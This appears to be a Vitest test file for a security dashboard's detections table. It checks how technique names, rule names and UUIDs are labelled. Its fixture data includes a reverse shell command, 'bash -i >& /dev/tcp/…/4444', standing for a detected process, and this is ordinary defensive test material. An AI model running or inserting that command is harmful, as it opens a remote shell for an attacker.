import { render, screen, within } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { DetectionsTable } from '../../components/features/detections/DetectionsTable'
import { isUuid, ruleLabel, techniqueLabel } from '../../components/features/detections/utils'
import type { Detection } from '../../types/api'

/** A detection as the pipeline stores it: the rule title as technique name, the rule UUID as rule name. */
const fromPipeline: Detection = {
  id: 'det-1',
  score: 5.8,
  severity: 'high',
  technique_id: 'T1059.004',
  technique_name: 'Reverse Shell Command Line',
  name: 'Reverse Shell Command Line',
  host: 'web-01.example.org',
  tactic: 'Execution',
  status: 'active',
  time: '2026-11-24T14:28:48Z',
  rule_name: 'ec09518a-b81b-4fe5-9bdf-dd9fc96c01e2',
  process: 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1',
  user: 'alice',
}

/** A detection with real names, as the demo data has them. */
const named: Detection = {
  ...fromPipeline,
  id: 'det-2',
  technique_name: 'Unix Shell',
  name: 'Interactive shell to a remote address',
  rule_name: 'Sigma: reverse shell',
}

function renderTable(detections: Detection[]) {
  return render(
    <DetectionsTable
      detections={detections}
      sort="time"
      order="desc"
      onSort={() => {}}
      activeId={null}
      onOpen={() => {}}
      selectable={false}
      checkedIds={new Set()}
      onToggle={() => {}}
      onToggleAll={() => {}}
      liveIds={new Set()}
    />,
  )
}

describe('detection labels', () => {
  it('recognises a UUID', () => {
    expect(isUuid('ec09518a-b81b-4fe5-9bdf-dd9fc96c01e2')).toBe(true)
    expect(isUuid('Sigma: reverse shell')).toBe(false)
    expect(isUuid(undefined)).toBe(false)
  })

  it('drops a technique name that only repeats the detection name or the technique ID', () => {
    expect(techniqueLabel(fromPipeline)).toBe('')
    expect(techniqueLabel({ ...fromPipeline, technique_name: 'T1059.004' })).toBe('')
    expect(techniqueLabel(named)).toBe('Unix Shell')
  })

  it('drops a rule name that is a UUID or repeats the detection name', () => {
    expect(ruleLabel(fromPipeline)).toBe('')
    expect(ruleLabel({ ...fromPipeline, rule_name: 'Reverse Shell Command Line' })).toBe('')
    expect(ruleLabel(named)).toBe('Sigma: reverse shell')
  })

  it('shows the process under the name instead of the rule UUID, and the title only once', () => {
    renderTable([fromPipeline])
    const row = screen.getAllByRole('row')[1]
    expect(within(row).getAllByText('Reverse Shell Command Line')).toHaveLength(1)
    expect(within(row).getByText('bash -i >& /dev/tcp/203.0.113.66/4444 0>&1')).toBeInTheDocument()
    expect(row).not.toHaveTextContent('ec09518a')
  })

  it('keeps a real technique name and rule name', () => {
    renderTable([named])
    const row = screen.getAllByRole('row')[1]
    expect(within(row).getByText('Unix Shell')).toBeInTheDocument()
    expect(within(row).getByText('Sigma: reverse shell')).toBeInTheDocument()
  })
})
